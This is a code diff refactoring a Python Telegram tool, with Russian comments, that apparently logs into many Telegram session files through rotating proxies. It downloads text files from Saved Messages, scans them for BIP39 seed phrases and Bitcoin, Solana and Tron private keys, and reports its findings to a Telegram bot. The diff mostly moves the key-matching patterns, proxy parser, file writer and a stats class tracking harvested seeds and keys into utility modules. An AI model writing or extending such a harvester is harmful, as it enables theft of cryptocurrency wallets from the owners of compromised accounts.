@@ -7,9 +7,12 @@ from datetime import datetime
 from random import choice
 from pyrogram import Client, enums
 
+from utils.states import Stats
 from utils.time_utils import random_delay
 from utils.tg_funcs import send_message_to_telegram
+from utils.files_utils import write_to_file, parse_proxy
 from utils.basic import get_bip39_words, get_usernames, get_proxies
+from utils.patterns import HASH_PATTERN, BITCOIN_PATTERN, SOLANA_PATTERN, TRON_PATTERN
 
 from config import (
     TELEGRAM_BOT_TOKEN,
@@ -20,17 +23,9 @@ from config import (
 )
 
 
-HASH_PATTERN = re.compile(r"0x[a-zA-Z0-9]{64}")
-BITCOIN_PATTERN = re.compile(
-    r"\b[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{44}\d{8}\b"
-)
-SOLANA_PATTERN = re.compile(
-    r"\b[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{87}\b"
-)
-TRON_PATTERN = re.compile(r"\b4[1234567890abcdef]{63}\b")
-
 current_time = datetime.now().strftime("%d.%m.%Y_%H.%M")
 OUTPUT_FILE = f"{LOGS_DIR}/output_{current_time}.txt"
+stats = Stats()
 
 
 async def download_txt_files_from_saved_messages(app, session_name):
@@ -67,23 +62,6 @@ async def check_contacts(app, session_name):
         print(f"Ошибка при проверке контактов: {e}")
 
 
-def parse_proxy(proxy_line):
-    try:
-        user_password, host_port = proxy_line.rsplit("@", 1)
-        user, password = user_password.split(":", 1)
-        host, port = host_port.split(":", 1)
-        return {
-            "scheme": "http",
-            "hostname": host,
-            "port": int(port),
-            "username": user,
-            "password": password,
-        }
-    except Exception as e:
-        print(f"Ошибка при парсинге прокси: {e}")
-        return None
-
-
 def is_valid_mnemonic(text):
     try:
         BIP39_WORDS = get_bip39_words()
@@ -111,16 +89,6 @@ def find_keys(text):
         return {}
 
 
-def write_to_file(filename, data):
-    try:
-        if not os.path.exists(LOGS_DIR):
-            os.makedirs(LOGS_DIR)
-        with open(filename, "a", encoding="utf-8") as f:
-            f.write(data + "\n")
-    except Exception as e:
-        print(f"Ошибка при записи в файл: {e}")
-
-
 def update_invalid_sessions_stats(session_name, error_type):
     stats_file = f"{LOGS_DIR}/invalid_sessions_stats.json"
     try:
@@ -140,21 +108,6 @@ def update_invalid_sessions_stats(session_name, error_type):
             json.dump(stats, f, indent=4)
     except Exception as e:
         print(f"Ошибка при обновлении статистики: {e}")
-
-
-class Stats:
-    def __init__(self):
-        self.seed_phrases = []
-        self.private_keys = []
-        self.total_seeds = 0
-        self.total_privkeys = 0
-        self.processed_sessions = 0
-        self.invalid_sessions = 0
-        self.combined_findings = 0
-        self.total_sessions = 0
-
-
-stats = Stats()
 
 
 async def check_text(text, session_name):
@@ -242,7 +195,7 @@ async def process_session(session_path, session_name):
         print(f"Пропуск сессии {session_name}: отсутствуют api_id или api_hash")
         return
 
-    # Пробуем найти рабочий прокси
+    # пробуем найти рабочий прокси
     proxy = None
     max_proxy_attempts = 3
     proxy_attempts = 0
